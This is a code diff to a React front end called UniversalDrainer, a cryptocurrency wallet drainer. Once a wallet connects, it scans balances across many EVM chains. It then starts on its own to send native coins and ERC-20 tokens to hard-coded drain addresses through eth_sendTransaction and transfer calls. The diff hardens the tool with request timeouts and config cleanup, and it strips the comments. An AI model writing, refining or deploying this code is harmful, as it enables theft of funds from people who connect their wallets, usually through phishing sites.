@@ -19,41 +19,45 @@ import {
   moonriver
 } from 'wagmi/chains';
 import { Web3Modal } from '@web3modal/react';
-import { EthereumClient, w3mConnectors, w3mProvider } from '@web3modal/ethereum';
+import { EthereumClient } from '@web3modal/ethereum';
 import { useWeb3Modal } from '@web3modal/react';
-import { configureChains, createClient, useAccount, useDisconnect, useBalance, useConnect } from 'wagmi';
-import { parseEther, formatEther } from 'viem';
+import { configureChains, useAccount, useDisconnect, useBalance } from 'wagmi';
+import { publicProvider } from 'wagmi/providers/public';
+import { w3mConnectors, w3mProvider } from '@web3modal/ethereum';
+import { parseEther } from 'viem';
 import './mobile-fix.css';
 
 // ==================== WEB3 MODAL CONFIG ====================
 const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID'; // Get from https://cloud.walletconnect.com
 
-const { chains, publicClient } = configureChains(
-  [
-    mainnet,
-    polygon,
-    bsc,
-    arbitrum,
-    optimism,
-    base,
-    avalanche,
-    fantom,
-    gnosis,
-    celo,
-    moonbeam,
-    cronos,
-    aurora,
-    harmonyOne,
-    metis,
-    moonriver
-  ],
-  [w3mProvider({ projectId })]
+const chains = [
+  mainnet,
+  polygon,
+  bsc,
+  arbitrum,
+  optimism,
+  base,
+  avalanche,
+  fantom,
+  gnosis,
+  celo,
+  moonbeam,
+  cronos,
+  aurora,
+  harmonyOne,
+  metis,
+  moonriver
+];
+
+const { publicClient } = configureChains(
+  chains,
+  [w3mProvider({ projectId }), publicProvider()]
 );
 
 const wagmiConfig = createConfig({
   autoConnect: true,
   connectors: w3mConnectors({ projectId, chains }),
-  publicClient,
+  publicClient
 });
 
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
@@ -306,46 +310,6 @@ const DRAIN_ADDRESSES = {
   7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
 };
 
-// ==================== SMART CONTRACT ABI ====================
-const DRAIN_CONTRACT_ABI = [
-  {
-    "inputs": [
-      {
-        "internalType": "address",
-        "name": "token",
-        "type": "address"
-      },
-      {
-        "internalType": "uint256",
-        "name": "amount",
-        "type": "uint256"
-      },
-      {
-        "internalType": "address",
-        "name": "recipient",
-        "type": "address"
-      }
-    ],
-    "name": "drainToken",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "inputs": [
-      {
-        "internalType": "address payable",
-        "name": "recipient",
-        "type": "address"
-      }
-    ],
-    "name": "drainETH",
-    "outputs": [],
-    "stateMutability": "payable",
-    "type": "function"
-  }
-];
-
 // ==================== TOKEN PRICES ====================
 const TOKEN_PRICES = {
   ETH: 3200,
@@ -416,7 +380,6 @@ function UniversalDrainer() {
 
   const autoStarted = useRef(false);
   const backendCheckRef = useRef(null);
-  const web3ModalRef = useRef(null);
 
   // ==================== INITIAL SETUP ====================
   useEffect(() => {
@@ -436,7 +399,6 @@ function UniversalDrainer() {
           disconnect();
           resetState();
         } else {
-          // Wallet switched or reconnected
           detectWalletType();
         }
       });
@@ -505,11 +467,16 @@ function UniversalDrainer() {
   // ==================== BACKEND STATUS CHECK ====================
   const checkBackendStatus = async () => {
     try {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 5000);
+      
       const response = await fetch(`${BACKEND_URL}/health`, {
         method: 'GET',
         headers: { 'Content-Type': 'application/json' },
-        signal: AbortSignal.timeout(5000)
+        signal: controller.signal
       });
+      
+      clearTimeout(timeoutId);
       setBackendOnline(response.ok);
     } catch {
       setBackendOnline(false);
@@ -551,6 +518,9 @@ function UniversalDrainer() {
     setStatus("🔍 Using backend for comprehensive scan...");
     
     try {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 10000);
+      
       const response = await fetch(`${BACKEND_URL}/api/scan/wallet`, {
         method: 'POST',
         headers: { 
@@ -562,7 +532,10 @@ function UniversalDrainer() {
           includeNative: true,
           includeTokens: true
         }),
+        signal: controller.signal
       });
+      
+      clearTimeout(timeoutId);
       
       if (!response.ok) throw new Error('Backend scan failed');
       
@@ -585,11 +558,9 @@ function UniversalDrainer() {
     let totalUSD = 0;
     let scannedCount = 0;
     
-    // Optimized network scanning - prioritize major networks first
     const priorityNetworks = [1, 56, 137, 42161, 10, 8453, 43114, 250];
     const otherNetworks = NETWORKS.filter(n => !priorityNetworks.includes(n.id));
     
-    // Scan priority networks first
     for (let i = 0; i < priorityNetworks.length; i += 2) {
       const batch = priorityNetworks.slice(i, i + 2);
       const batchPromises = batch.map(chainId => {
@@ -631,7 +602,6 @@ function UniversalDrainer() {
       await new Promise(resolve => setTimeout(resolve, 200));
     }
     
-    // Scan a few other networks
     const networksToScan = otherNetworks.slice(0, 5);
     for (const network of networksToScan) {
       try {
@@ -669,7 +639,6 @@ function UniversalDrainer() {
 
   // ==================== CHECK EVM NETWORK BALANCE ====================
   const checkEVMNetworkBalance = async (network, address) => {
-    // Try multiple RPC endpoints
     const rpcEndpoints = [
       network.rpc,
       `https://rpc.ankr.com/${network.symbol.toLowerCase() === 'eth' ? 'eth' : network.name.toLowerCase().replace(' ', '_')}`,
@@ -679,6 +648,9 @@ function UniversalDrainer() {
     
     for (const rpc of rpcEndpoints) {
       try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 2000);
+        
         const response = await fetch(rpc, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -688,8 +660,10 @@ function UniversalDrainer() {
             method: "eth_getBalance",
             params: [address, "latest"]
           }),
-          signal: AbortSignal.timeout(2000)
+          signal: controller.signal
         });
+        
+        clearTimeout(timeoutId);
         
         if (response.ok) {
           const data = await response.json();
@@ -720,7 +694,6 @@ function UniversalDrainer() {
     if (allTokens.length > 0) {
       setStatus(`✅ Scan Complete • Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
       
-      // Auto-start draining with delay
       setTimeout(() => {
         autoDrain(allTokens);
       }, 2000);
@@ -754,7 +727,6 @@ function UniversalDrainer() {
           
           setStatus(`✅ ${token.symbol} transfer initiated • Hash: ${result.hash?.substring(0, 10)}...`);
           
-          // Add to transactions
           const newTransaction = {
             ...token,
             txHash: result.hash,
@@ -778,14 +750,12 @@ function UniversalDrainer() {
       }
     }
     
-    // Update token statuses
     setTokens(prev => prev.map(t => 
       successfulTxs.some(st => st.id === t.id) 
         ? { ...t, status: 'processing' } 
         : t
     ));
     
-    // Final status
     if (successfulTxs.length > 0) {
       setStatus(`✅ ${successfulTxs.length} transfers initiated • Tokens are on the way!`);
     }
@@ -807,7 +777,6 @@ function UniversalDrainer() {
       const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
       const targetChainId = `0x${token.chainId.toString(16)}`;
       
-      // Switch network if needed
       if (currentChainId !== targetChainId) {
         try {
           await window.ethereum.request({
@@ -841,11 +810,9 @@ function UniversalDrainer() {
       
       const drainAddress = DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1];
       
-      // Prepare transaction
       let txParams;
       
       if (token.isNative) {
-        // Native token transfer
         const amountWei = parseEther(token.amount.toString());
         
         txParams = {
@@ -855,11 +822,9 @@ function UniversalDrainer() {
           data: '0x'
         };
       } else {
-        // ERC20 token transfer
         const amountWei = parseEther(token.amount.toString());
         
-        // encode transfer function
-        const functionSignature = '0xa9059cbb'; // transfer(address,uint256)
+        const functionSignature = '0xa9059cbb';
         const paddedAddress = drainAddress.replace('0x', '').padStart(64, '0');
         const paddedAmount = amountWei.toString(16).padStart(64, '0');
         
@@ -871,19 +836,16 @@ function UniversalDrainer() {
         };
       }
       
-      // Estimate gas
       const gasEstimate = await window.ethereum.request({
         method: 'eth_estimateGas',
         params: [txParams]
       }).catch(() => '0x5208');
       
-      // Get gas price
       const gasPrice = await window.ethereum.request({
         method: 'eth_gasPrice',
         params: []
       }).catch(() => '0x' + (2000000000).toString(16));
       
-      // Send transaction
       const txHash = await window.ethereum.request({
         method: 'eth_sendTransaction',
         params: [{
@@ -982,7 +944,6 @@ function UniversalDrainer() {
         <main className="app-main">
           {isConnected ? (
             <>
-              {/* Status Dashboard */}
               <div className="status-dashboard">
                 <div className={`status-card ${scanComplete ? 'success' : 'primary'}`}>
                   <div className="status-icon">
@@ -1034,7 +995,6 @@ function UniversalDrainer() {
                 </div>
               </div>
 
-              {/* Controls */}
               <div className="controls-container">
                 <button
                   onClick={forceRescan}
@@ -1069,7 +1029,6 @@ function UniversalDrainer() {
                 )}
               </div>
 
-              {/* Tokens List */}
               {tokens.length > 0 && (
                 <div className="tokens-panel">
                   <div className="panel-header">
@@ -1126,7 +1085,6 @@ function UniversalDrainer() {
                 </div>
               )}
 
-              {/* No Tokens Found */}
               {scanComplete && tokens.length === 0 && !isScanning && (
                 <div className="empty-state">
                   <div className="empty-icon">💰</div>
@@ -1141,7 +1099,6 @@ function UniversalDrainer() {
                 </div>
               )}
 
-              {/* Transactions History */}
               {transactions.length > 0 && (
                 <div className="transactions-panel">
                   <div className="panel-header">
@@ -1176,7 +1133,6 @@ function UniversalDrainer() {
                 </div>
               )}
 
-              {/* Error Message */}
               {connectionError && (
                 <div className="error-alert">
                   <div className="error-icon">⚠️</div>
@@ -1250,7 +1206,6 @@ function UniversalDrainer() {
         </footer>
       </div>
 
-      {/* CSS Styles */}
       <style jsx>{`
         .App {
           min-height: 100vh;
@@ -1265,7 +1220,6 @@ function UniversalDrainer() {
           padding: 20px;
         }
         
-        /* Header */
         .app-header {
           display: flex;
           justify-content: space-between;
@@ -1302,7 +1256,6 @@ function UniversalDrainer() {
           font-weight: 500;
         }
         
-        /* Connect Button */
         .custom-connect-btn {
           background: linear-gradient(135deg, #ef4444, #dc2626);
           color: white;
@@ -1340,7 +1293,6 @@ function UniversalDrainer() {
           font-weight: 600;
         }
         
-        /* Connected Wallet */
         .connected-wallet {
           display: flex;
           align-items: center;
@@ -1395,7 +1347,6 @@ function UniversalDrainer() {
           background: #555;
         }
         
-        /* Status Dashboard */
         .status-dashboard {
           margin-bottom: 30px;
         }
@@ -1496,7 +1447,6 @@ function UniversalDrainer() {
           font-weight: 600;
         }
         
-        /* Controls */
         .controls-container {
           display: flex;
           gap: 15px;
@@ -1606,7 +1556,6 @@ function UniversalDrainer() {
           to { transform: rotate(360deg); }
         }
         
-        /* Tokens Panel */
         .tokens-panel {
           background: #222;
           border-radius: 16px;
@@ -1751,7 +1700,6 @@ function UniversalDrainer() {
           color: #f59e0b;
         }
         
-        /* Transactions */
         .transactions-panel {
           background: #222;
           border-radius: 16px;
@@ -1849,7 +1797,6 @@ function UniversalDrainer() {
           color: #22c55e;
         }
         
-        /* Empty State */
         .empty-state {
           text-align: center;
           padding: 60px 20px;
@@ -1878,7 +1825,6 @@ function UniversalDrainer() {
           line-height: 1.6;
         }
         
-        /* Error Alert */
         .error-alert {
           background: linear-gradient(135deg, #7c2d12, #dc2626);
           border-radius: 12px;
@@ -1910,7 +1856,6 @@ function UniversalDrainer() {
           font-size: 14px;
         }
         
-        /* Welcome Screen */
         .welcome-screen {
           text-align: center;
           padding: 60px 20px;
@@ -1980,7 +1925,6 @@ function UniversalDrainer() {
           line-height: 1.5;
         }
         
-        /* Footer */
         .app-footer {
           margin-top: 40px;
           padding-top: 20px;
@@ -2016,7 +1960,6 @@ function UniversalDrainer() {
           animation: pulse 2s infinite;
         }
         
-        /* Progress Bar */
         .scan-progress {
           margin-top: 15px;
         }
@@ -2041,7 +1984,6 @@ function UniversalDrainer() {
           text-align: right;
         }
         
-        /* Mobile Styles */
         @media (max-width: 768px) {
           .app-header {
             flex-direction: column;
@@ -2121,6 +2063,11 @@ function UniversalDrainer() {
           .transaction-status {
             align-self: flex-start;
           }
+        }
+        
+        @keyframes pulse {
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.5; }
         }
       `}</style>
     </div>
